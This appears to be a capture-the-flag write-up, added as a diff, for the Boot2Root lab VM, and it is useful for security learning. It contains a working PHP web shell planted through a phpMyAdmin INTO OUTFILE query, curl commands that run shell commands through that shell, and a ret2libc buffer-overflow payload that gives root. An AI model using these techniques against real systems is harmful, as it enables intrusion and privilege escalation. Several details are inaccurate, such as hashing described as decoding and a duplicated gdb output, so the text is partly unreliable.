@@ -1,0 +1,467 @@
+Solution for Boot2Root
+
+First, download Kali Linux image and add it to VirtualBox and then: Let's go!
+
+Set your local network in VirtualBox tools:
+	vboxnet0 10.0.2.0/24 
+	DHCP enable
+
+Set network for BornToSec and Kali linux iso:
+	Attached to NAT Network
+	Name: vboxnet0
+
+Start BornToSec
+Start Kali linux
+
+SOLUTION.
+STEP 1 - Collect information.
+
+In kali set command ifconfig:
+	Kali's IP address - 10.0.2.15
+
+Set Port forwarding for VirtualBox network:
+	Host IP: 127.0.0.1
+	Host port: 2222
+	Guest IP: 10.0.2.15
+	Guest port: 22
+
+start ssh from root on Kali:
+	sudo systemctl start ssh
+	or
+	service ssh start
+
+Connect to kali on SSH from host's terminal:
+	ssh kali@10.0.2.15 -p 2222
+
+Scan network with NMAP tool (Network Scanner):
+	nmap 10.0.2.0/24
+		Output:	
+			Nmap scan report for 10.0.2.4
+			Host is up (0.0017s latency).
+			Not shown: 994 closed tcp ports (conn-refused)
+			PORT    STATE SERVICE
+			21/tcp  open  ftp
+			22/tcp  open  ssh
+			80/tcp  open  http
+			143/tcp open  imap
+			443/tcp open  https
+			993/tcp open  imaps
+
+See, that target (BornToSec) have list of opened ports (21,22,80,143,443,993) on IP 10.0.2.4.
+
+Scan HTTP and HTTPS links for this IP with DIRB tool (Web Content Scanner),
+Using '-r' option for optimization(-r : Don't search recursively):
+	dirb http://10.0.2.4
+		Output:	
+			...
+			---- Scanning URL: http://10.0.2.4/ ----
+			+ http://10.0.2.4/cgi-bin/ (CODE:403|SIZE:284)
+			==> DIRECTORY: http://10.0.2.4/fonts/
+			+ http://10.0.2.4/forum (CODE:403|SIZE:281)
+			+ http://10.0.2.4/index.html (CODE:200|SIZE:1025)
+			+ http://10.0.2.4/server-status (CODE:403|SIZE:289)
+			...
+
+	dirb http://10.0.2.4
+		Output:	
+			...
+			---- Scanning URL: https://10.0.2.4/ ----
+			+ https://10.0.2.4/cgi-bin/ (CODE:403|SIZE:285)
+			==> DIRECTORY: https://10.0.2.4/forum/
+			==> DIRECTORY: https://10.0.2.4/phpmyadmin/
+			+ https://10.0.2.4/server-status (CODE:403|SIZE:290)
+			==> DIRECTORY: https://10.0.2.4/webmail/
+
+			---- Entering directory: https://10.0.2.4/forum/ ----
+			+ https://10.0.2.4/forum/backup (CODE:403|SIZE:289)
+			+ https://10.0.2.4/forum/config (CODE:403|SIZE:289)
+			==> DIRECTORY: https://10.0.2.4/forum/images/
+			==> DIRECTORY: https://10.0.2.4/forum/includes/
+			+ https://10.0.2.4/forum/index (CODE:200|SIZE:4935)
+			+ https://10.0.2.4/forum/index.php (CODE:200|SIZE:4935)
+			==> DIRECTORY: https://10.0.2.4/forum/js/
+			==> DIRECTORY: https://10.0.2.4/forum/lang/
+			==> DIRECTORY: https://10.0.2.4/forum/modules/
+			==> DIRECTORY: https://10.0.2.4/forum/templates_c/
+			...
+
+See, that target (BornToSec) have some available web services on links:
+	https://10.0.2.4/forum/
+	https://10.0.2.4/phpmyadmin/
+	https://10.0.2.4/webmail/
+	
+STEP 2 - sources research and make SQL-injection for getting access.
+
+Part 1.
+
+Open links on Kali's Web Browser.
+First link - https://10.0.2.4/forum/:
+	Go to message from lmezard 'Probleme login ?' read it, and find a password:
+		...
+		Oct 5 08:45:29 BornToSecHackMe sshd[7547]: Failed password for invalid user !q\]Ej?*5K5cy*AJ from 161.202.39.38 port 57764 ssh2
+		...
+
+	Login to forum:
+		Username: lmezard
+		Password: !q\]Ej?*5K5cy*AJ
+
+	Open lmezard's profile and get email address:
+		laurie@borntosec.net
+
+Second link - https://10.0.2.4/webmail/:
+	Login to mailbox:
+		Name: laurie@borntosec.net
+		Password: !q\]Ej?*5K5cy*AJ
+
+	Open letter with subject "DB Access":
+		...
+		Use root/Fg-'kKXBj87E:aJ$
+		...
+Third link - https://10.0.2.4/phpmyadmin/:
+	Login to phpMyAdmin panel:
+		Username: root
+		Password: Fg-'kKXBj87E:aJ$
+
+Part 2.
+
+	Run SQL-injection code (write php-code to call system shell into file on website folder):
+		SELECT  '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/forum/templates_c/hack.php'
+
+	Call exploit file from Kali's terminal with CURL tool (util for making web requests) for running some commands:
+		Needed commands:
+			ls -la /home
+			ls -ls /home/LOOKATME
+			cat /home/LOOKATME/password
+
+		1) curl --insecure 'https://10.0.2.4/forum/templates_c/hack.php?cmd=ls%20-la%20/home'
+ 
+			Output:
+				total 0
+				drwxrwx--x 1 www-data             root                  60 Oct 13  2015 .
+				drwxr-xr-x 1 root                 root                 220 Jan 17 10:27 ..
+				drwxr-x--- 2 www-data             www-data              31 Oct  8  2015 LOOKATME
+				drwxr-x--- 6 ft_root              ft_root              156 Jun 17  2017 ft_root
+				drwxr-x--- 3 laurie               laurie               143 Oct 15  2015 laurie
+				drwxr-x--- 1 laurie@borntosec.net laurie@borntosec.net  60 Oct 15  2015 laurie@borntosec.net
+				dr-xr-x--- 2 lmezard              lmezard               61 Oct 15  2015 lmezard
+				drwxr-x--- 3 thor                 thor                 129 Oct 15  2015 thor
+				drwxr-x--- 4 zaz                  zaz                  147 Oct 15  2015 zaz
+
+		2) curl --insecure 'https://10.0.2.4/forum/templates_c/hack.php?cmd=ls%20-la%20/home/LOOKATME'
+			Output:
+				total 1
+				drwxr-x--- 2 www-data www-data 31 Oct  8  2015 .
+				drwxrwx--x 1 www-data root     60 Oct 13  2015 ..
+				-rwxr-x--- 1 www-data www-data 25 Oct  8  2015 password
+
+		3) curl --insecure 'https://10.0.2.4/forum/templates_c/hack.php?cmd=cat%20/home/LOOKATME/password'
+			Output:
+				lmezard:G!@M6f4Eatau{sF"
+
+
+See login and password for FTP access.
+
+STEP 3 - Analyze web dump files and decode password.
+
+Connect to FTP server on target (BornToSec):
+	ftp lmezard@10.0.2.4
+
+Discover content of FTP server:
+	ftp> ls
+		Output:
+			229 Entering Extended Passive Mode (|||29520|).
+			150 Here comes the directory listing.
+			-rwxr-x---    1 1001     1001           96 Oct 15  2015 README
+			-rwxr-x---    1 1001     1001       808960 Oct 08  2015 fun
+
+Download these files to Kali and exit from FTP:
+	ftp> get README
+	ftp> get fun
+	ftp> exit
+
+Read README:
+	cat README
+		Output: Complete this little challenge and use the result as password for user 'laurie' to login in ssh
+
+'fun' is archive file. Extract files from archive 'fun':
+	tar -xf fun
+
+There are many files in ft_fun directory, which was extracted from 'fun':
+	run command: cat *.pcap > logfile
+	This is c-code
+
+Write script and put it in directory 'ft_fun':
+			vim ft_fun/script.py
+
+			Copy this text there:
+
+"
+
+import os
+import re
+
+arr = os.listdir('./')
+nums = []
+lines = []
+for path in arr:
+    with open(path, 'r') as f:
+        line = f.readline()
+        code = ""
+        num = None
+        while line:
+            if line.startswith('//'):
+                regres = re.search(r'\d+', line)
+                if regres:
+                    num = int(regres.group())
+            else:
+                code += line
+            line = f.readline()
+        if num:
+            nums.append(num)
+            lines.append(code)
+
+print(len(nums), len(lines))
+res = [None] * len(nums)
+for i in range(0, len(nums)):
+    if nums[i] is not None:
+        res[nums[i] - 1] = lines[i]
+
+with open('../prog.c', 'w') as f:
+    for line in res:
+        if line is not None:
+            print(line, file = f)
+
+"
+
+Run script from 'ft_fun' directory:
+	cd ft_fun
+	python script.py
+	cd ..
+
+Or make it by hands. Result:
+
+"
+
+#include <stdio.h>
+char getme1() { return 'I'; }
+char getme2() { return 'h'; }
+char getme3() { return 'e'; }
+char getme4() { return 'a'; }
+char getme5() { return 'r'; }
+char getme6() { return 't'; }
+char getme7() { return 'p'; }
+char getme8() { return 'w'; }
+char getme9() { return 'n'; }
+char getme10() { return 'a'; }
+char getme11() { return 'g'; }
+char getme12() { return 'e'; }
+int main() {
+	printf("M");
+	printf("Y");
+	printf(" ");
+	printf("P");
+	printf("A");
+	printf("S");
+	printf("S");
+	printf("W");
+	printf("O");
+	printf("R");
+	printf("D");
+	printf(" ");
+	printf("I");
+	printf("S");
+	printf(":");
+	printf(" ");
+	printf("%c",getme1());
+	printf("%c",getme2());
+	printf("%c",getme3());
+	printf("%c",getme4());
+	printf("%c",getme5());
+	printf("%c",getme6());
+	printf("%c",getme7());
+	printf("%c",getme8());
+	printf("%c",getme9());
+	printf("%c",getme10());
+	printf("%c",getme11());
+	printf("%c",getme12());
+	printf("\n");
+	printf("Now SHA-256 it and submit");
+}
+
+"
+
+At home directory is 'prog.c' file,
+compile it with GCC, then run binary:
+	gcc prog.c
+	./a.out
+		Output:
+			MY PASSWORD IS: Iheartpwnage
+
+It is not a password. Decode it with SHA-256 and then submit:
+
+	echo -n "Iheartpwnage" | shasum -a 256
+		Output:
+			330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4
+
+This is password for ssh connection with user "laurie".
+
+
+STEP 4 - Defuse bomb
+
+Connect to target (BornToSec) on SSH:
+	ssh laurie@10.0.2.4
+
+Discover content on target:
+	ls
+		Output:
+			README  bomb
+
+	cat README
+		Output:
+			Diffuse this bomb!
+			When you have all the password use it as "thor" user with ssh.
+
+			HINT:
+			P
+			 2
+			 b
+			
+			o
+			4
+
+			NO SPACE IN THE PASSWORD (password is case sensitive).
+
+	'bomb' is a binary file, should to defuse this bomb.
+
+Copy DEFUSER (tools for defusing bomb) to Kali:
+	scp -P 2222 /Users/ophuong/defuser.zip  kali@localhost:/home/kali
+
+Go to Kali and unzip 'defuser.zip':
+	unzip defuzer.zip
+
+Go to directory 'defuser', compile with GCC and run all solvers:
+	gcc <filename>
+	./a.out
+
+		ANSWER 1: Public speaking is very easy.
+
+		ANSWER 2: 1 2 6 24 120 720
+
+		ANSWER 3: 1 b 214
+
+		ANSWER 4: 9
+
+		ANSWER 5: opekmq
+
+		ANSWER 6: 4 2 6 3 1 5
+
+Start 'bomb' and check answers:
+	./bomb
+
+Connect all answers and it is a key:
+
+	Password for 'Thor' is "Publicspeakingisveryeasy.126241207201b2149opekmq426135"
+
+STEP 5 - Playing turtle.
+
+Connect to user 'thor':
+	su thor
+		Password: Publicspeakingisveryeasy.126241207201b2149opekmq426135
+
+Discover content on target:
+	ls
+		Output:
+			README  bomb
+
+	cat README
+		Output:
+			Finish this challenge and use the result as password for 'zaz' user.
+
+Download file turtle to host:
+	scp -P 4242 thor@localhost:/home/thor/turtle turtle
+
+Replace French words in file 'turtle' with their English translation: run command for convert to python LOGO code
+awk '{sub(/Avance /,"t.forward(")}1' turtle > temp && mv temp turtle
+awk '{sub(/Recule /,"t.backward(")}1' turtle > temp && mv temp turtle
+awk '{sub(/ spaces/,")")}1' turtle > temp && mv temp turtle
+awk '{sub(/Tourne droite de /,"t.right(")}1' turtle > temp && mv temp turtle
+awk '{sub(/Tourne gauche de /,"t.left(")}1' turtle > temp && mv temp turtle
+awk '{sub(/ degrees/,")")}1' turtle > temp && mv temp turtle
+
+See Python LOGO code (Program for teaching kids).
+Go to site of programming school:
+	https://metaschool.ru/pub/konkurs/python/turtle/index.php
+
+First paste this text in code window there:
+"
+
+t.penup()
+t.left(90)
+t.forward(60)
+t.left(90)
+t.forward(60)
+t.pendown()
+
+"
+
+Open 'turtle' in text editor, copy all code and paste this text in code window on school's site.
+Then run it.
+
+See letters on picture, it is 'SLASH', but it is not a key.
+
+Go to site https://www.md5.cz/.
+Decode 'SLASH' with MD5:
+	Password is "646da671ca01bb5d84dbb5fb2238dc8e"
+
+STEP 6 - Disassembling and buffer overflow.
+
+Connect to user 'zaz':
+	su zaz
+		Password: 646da671ca01bb5d84dbb5fb2238dc8e
+
+Discover content on target:
+	ls
+		Output:
+			exploit_me  mail
+
+'exploit_me' I a binary file, program that takes a command line argument and print it:
+	./exploit_me QWERTY
+		Output:
+			QWERTY
+
+Run 'expploit_me' with GDB (Debugger tool):
+	gdb exploit_me
+
+		More:
+		break main
+		run
+		print &system
+			Output:
+				$1 = (<text variable, no debug info> *) 0xb7e6b060 <system> (Converted to shellcode: '\xb7\xe6\xb0\x60')
+
+		find &system, +9999999, "/bin/sh"
+			Output:
+				$1 = (<text variable, no debug info> *) 0xb7e6b060 <system> (Converted to shellcode: '\xb7\xf8\xcc\x58')
+
+		Pass to program argument size of 140 byte:
+			(gdb) r Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1A	\
+				c2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ag	\
+				Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5	
+				
+				Output:
+
+					Program received signal SIGSEGV, Segmentation fault.
+					0x37654136 in ?? ()
+
+Offset is 140
+
+Run program with special python script as argument:
+
+	./exploit_me $(python -c "print('.' * 140 + '\xb7\xe6\xb0\x60'[::-1] + '\xb7\xe5\xeb\xe0'[::-1] + '\xb7\xf8\xcc\x58'[::-1])")
+
+BINGO! It is 'root', now!
+
+Check result:
+	whoami
+		Output:
+			root
